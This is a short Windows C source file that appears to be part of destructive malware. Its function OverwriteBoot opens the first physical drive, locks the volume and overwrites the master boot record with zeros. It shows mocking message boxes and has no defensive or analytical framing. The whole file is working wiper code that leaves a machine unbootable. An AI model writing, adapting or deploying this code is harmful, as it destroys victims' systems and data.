#include "przejebane.h"

BOOL
WINAPI
OverwriteBoot(
	VOID
)
{
	DWORD dwBytesWritten;

	WCHAR szEmptyData[ 512 ];
	RtlZeroMemory( szEmptyData, 512 );

	HANDLE hPhysicalDrive = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );

	if ( hPhysicalDrive == INVALID_HANDLE_VALUE )
	{
		MessageBoxW( NULL, L"you are safe. for now...", L"POLSKA :fire:", MB_OK | MB_ICONERROR );
		CloseHandle( hPhysicalDrive );
		return FALSE;
	}

	DeviceIoControl( hPhysicalDrive, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesWritten, NULL );
	BOOL bOverwriteCheck = WriteFile( hPhysicalDrive, szEmptyData, 512, &dwBytesWritten, NULL );

	if ( !bOverwriteCheck )
	{
		MessageBoxW( NULL, L"WHAT THE FUCK? DAMMIT! HOLY SHIT!", L"Omfg....", MB_OK | MB_ICONERROR );
		CloseHandle( hPhysicalDrive );
		return FALSE;
	}

	DeviceIoControl( hPhysicalDrive, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesWritten, NULL );
	CloseHandle( hPhysicalDrive );
	return TRUE;
}